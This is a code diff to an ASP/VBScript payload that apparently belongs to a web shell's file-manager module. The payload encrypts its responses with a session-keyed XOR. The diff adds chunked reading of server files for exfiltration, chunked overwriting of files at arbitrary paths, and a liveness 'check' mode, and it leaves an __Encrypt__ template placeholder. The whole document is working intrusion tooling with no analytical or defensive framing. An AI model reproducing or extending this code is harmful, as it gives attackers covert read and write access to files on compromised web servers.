@@ -12,6 +12,22 @@ Function Base64Encode(sText)
     Set oNode = Nothing
     Set oXML = Nothing
 End Function
+
+Function Base64EncodeBinary(data)
+    Dim oXML, oNode
+
+    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
+    Set oNode = oXML.CreateElement("base64")
+    oNode.dataType = "bin.base64"
+    oNode.nodeTypedValue =data
+    If Mid(oNode.text,1,4)="77u/" Then
+    oNode.text=Mid(oNode.text,5)
+    End If
+    Base64EncodeBinary = Replace(oNode.text, vbLf, "")
+    Set oNode = Nothing
+    Set oXML = Nothing
+End Function
+
 Function Base64Decode(ByVal vCode)
     Dim oXML, oNode
 
@@ -40,14 +56,7 @@ Function Stream_StringToBinary(Text)
 End Function
 
 
-Function Encrypt(data)
-key=Session("k")
-size=len(data)
-For i=1 To size
-encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
-Next
-Encrypt=encryptResult
-End Function
+__Encrypt__
 
 Function list(path)
 on error resume next
@@ -159,6 +168,22 @@ Sub download(path)
 		end with
 End Sub
 
+Function downloadPart(path,blockIndex,blockSize)
+		Dim stream,filecontent
+		Set stream=GetStream()
+		stream.Open
+		stream.Type=1
+		stream.LoadFromFile path
+
+		stream.Position = blockIndex*blockSize
+
+		filecontent = stream.Read(blockSize)
+
+		stream.Close
+		Set stream=Nothing
+		downloadPart=filecontent
+End Function
+
 Function delete(path)
 	deleteResult=False
 	Set Fso=GetFso()
@@ -240,6 +265,40 @@ Function append(path, content)
  append=uploadResult
 End Function
 
+Function update(path, blockIndex,blockSize,content)
+  on error resume next
+  updateResult=False
+  Const adTypeBinary = 1
+  Const adSaveCreateOverWrite = 2
+  
+  'Create Stream object
+  Dim BinaryStream
+  Set BinaryStream = CreateObject("ADODB.Stream")
+  
+  'Specify stream type - we want To save binary data.
+  BinaryStream.Type = adTypeBinary
+  
+  'Open the stream And write binary data To the object
+  BinaryStream.Open
+  'BinaryStream.LoadFromFile path
+  BinaryStream.Position = blockIndex*blockSize
+    If Err Then
+  	SendErr Err
+  	End If
+  BinaryStream.Write content
+      If Err Then
+    	SendErr Err
+    	End If
+  'Save binary data To disk
+  BinaryStream.SaveToFile path, adSaveCreateOverWrite
+  If Err Then 
+	SendErr Err
+Else
+	updateResult=True 
+	End If 
+update=updateResult
+End Function
+
 Sub main(arrArgs)
 	mode=arrArgs(0)
 	path=arrArgs(1)
@@ -251,7 +310,7 @@ Sub main(arrArgs)
 			If  UBound(arrArgs)=2 Then
 				charset=arrArgs(2)
 			End If
-		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(show(path,charset))&"""}"
+		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(Base64Encode(show(path,charset)))&"""}"
 	ElseIf mode="download" Then
 		download path
 	elseif mode="delete" Then
@@ -282,8 +341,28 @@ Sub main(arrArgs)
 	    	appendResult=chrw(36861)&chrw(21152)&chrw(22833)&chrw(36133)
 	    	finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(path&appendResult)&"""}"
 	    End If
-				
-	End If	
+	ElseIf mode="update" Then
+		blockIndex=arrArgs(2)
+		blockSize=arrArgs(3)
+		content=arrArgs(4)
+		dim updateResult
+	    If update(path,CLng(blockIndex),CLng(blockSize),Base64Decode(content)) Then
+			updateResult=chrw(36861)&chrw(21152)&chrw(25104)&chrw(21151)
+	    	finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(path)&"""}"
+	    Else  
+		updateResult=chrw(36861)&chrw(21152)&chrw(22833)&chrw(36133)
+	    	finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(path)&"""}"
+	    End If				
+    ElseIf mode="check" Then
+	    finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(path)&"""}"
+	ElseIf mode="downloadPart" Then
+		blockIndex=arrArgs(2)
+		blockSize=arrArgs(3)
+		dim downloadPartResult
+		downloadPartResult=Base64EncodeBinary(downloadPart(path,CLng(blockIndex),CLng(blockSize)))
+		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(downloadPartResult)&"""}"
+	End If
+
 	Response.binarywrite(Encrypt(finalResult))
 End Sub
 
